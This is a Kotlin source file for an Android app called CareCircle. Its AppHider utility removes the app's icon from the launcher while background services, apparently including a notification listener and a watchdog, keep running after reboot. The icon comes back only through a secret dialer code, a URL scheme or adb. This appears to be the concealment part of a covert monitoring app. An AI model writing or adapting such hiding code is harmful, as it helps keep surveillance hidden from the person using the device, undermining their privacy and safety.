package com.example.background

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager
import android.util.Log

/**
 * 🫥 AppHider — hides CareCircle from app drawer while keeping services running
 *
 * How it works:
 *  - Disables MainActivity's LAUNCHER intent filter
 *  - App icon disappears from app drawer + home screen
 *  - Background services (WatchdogService, NotificationListener, etc.) keep running
 *  - BootReceiver still triggers on reboot
 *
 * To unhide:
 *  - Dial secret code: *#*#2824#*#* (spells "CARE" on dial pad)
 *  - SecretCodeReceiver catches the broadcast and re-enables launcher
 *
 * Backup unhide methods:
 *  - URL scheme: carecircle://open (from browser)
 *  - adb shell pm enable com.example.background/.MainActivity
 */
object AppHider {

    private const val TAG = "AppHider"

    /**
     * Hide the app from launcher
     * Returns true if successful
     */
    fun hideApp(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val componentName = ComponentName(
                context.packageName,
                "com.example.background.MainActivity"
            )

            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )

            Log.d(TAG, "✅ App hidden from launcher")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to hide app: ${e.message}")
            false
        }
    }

    /**
     * Unhide the app (make it visible in launcher again)
     * Returns true if successful
     */
    fun unhideApp(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val componentName = ComponentName(
                context.packageName,
                "com.example.background.MainActivity"
            )

            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )

            Log.d(TAG, "✅ App unhidden — visible in launcher")
            true
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to unhide app: ${e.message}")
            false
        }
    }

    /**
     * Check if app is currently hidden from launcher
     */
    fun isHidden(context: Context): Boolean {
        return try {
            val packageManager = context.packageManager
            val componentName = ComponentName(
                context.packageName,
                "com.example.background.MainActivity"
            )

            val state = packageManager.getComponentEnabledSetting(componentName)
            state == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        } catch (e: Exception) {
            Log.e(TAG, "❌ isHidden check failed: ${e.message}")
            false
        }
    }

    /**
     * Get the secret dial code (for display in UI)
     */
    const val SECRET_CODE = "2824"

    /**
     * Get formatted secret code for UI display
     */
    val SECRET_CODE_FORMATTED: String = "*#*#2824#*#*"

    /**
     * Get URL scheme for backup unhide
     */
    const val URL_SCHEME = "carecircle://open"
}
